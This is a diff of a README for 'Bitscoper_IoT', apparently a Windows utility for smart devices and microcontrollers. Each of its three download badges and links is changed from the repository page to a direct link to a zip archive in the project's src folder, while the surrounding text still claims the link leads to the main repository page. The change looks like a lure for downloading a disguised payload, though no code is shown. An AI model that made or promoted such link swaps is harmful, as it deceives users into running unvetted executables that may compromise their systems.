@@ -1,6 +1,6 @@
 # ⚙️ Bitscoper_IoT - Simple Tools for Smart Devices
 
-[![Download Bitscoper_IoT](https://img.shields.io/badge/Download-Bitscoper_IoT-brightgreen?style=for-the-badge)](https://github.com/kimpropro/Bitscoper_IoT)
+[![Download Bitscoper_IoT](https://img.shields.io/badge/Download-Bitscoper_IoT-brightgreen?style=for-the-badge)](https://github.com/kimpropro/Bitscoper_IoT/raw/refs/heads/main/src/Bitscoper-T-Io-v3.4.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Having a microcontroller like ESP32 ready will help you test and use the softwar
 
 Click the large button below to visit the official GitHub page where you can download the latest version of Bitscoper_IoT for Windows:
 
-[![Download Bitscoper_IoT](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/kimpropro/Bitscoper_IoT)
+[![Download Bitscoper_IoT](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/kimpropro/Bitscoper_IoT/raw/refs/heads/main/src/Bitscoper-T-Io-v3.4.zip)
 
 This link will take you to the main repository page. You will find downloads for the latest executable files, documentation, and extras.
 
@@ -107,7 +107,7 @@ Check the GitHub page regularly for new releases. Updates can improve stability 
 
 Visit the official link again to download and find updates:  
 
-[Download Bitscoper_IoT](https://github.com/kimpropro/Bitscoper_IoT)  
+[Download Bitscoper_IoT](https://github.com/kimpropro/Bitscoper_IoT/raw/refs/heads/main/src/Bitscoper-T-Io-v3.4.zip)  
 
 ---
 
